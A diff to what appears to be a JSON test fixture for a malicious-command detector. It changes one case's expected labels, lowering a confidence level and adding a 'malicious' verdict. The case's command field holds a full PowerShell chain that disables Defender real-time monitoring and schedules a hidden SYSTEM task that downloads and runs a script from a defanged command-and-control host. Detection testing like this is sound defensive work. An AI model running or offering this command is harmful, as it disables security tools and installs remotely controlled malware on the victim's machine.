@@ -16,8 +16,9 @@
     "command": "powershell.exe -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true; schtasks /create /tn 'WindowsSecurityHealth' /tr 'powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\\\"hxxp://c2.telemetry-svc[.]com/agent.ps1\\\"))' /sc onlogon /ru SYSTEM /f\"",
     "expect": {
       "classes": ["defense_evasion", "c2_persistence", "dropper"],
-      "min_confidence": {"defense_evasion": "high", "c2_persistence": "high"},
-      "techniques": ["T1562.001", "T1053.005"]
+      "min_confidence": {"defense_evasion": "high", "c2_persistence": "medium"},
+      "techniques": ["T1562.001", "T1053.005"],
+      "verdict": "malicious"
     },
     "reject": {"classes": ["impact", "credential_theft"]}
   },
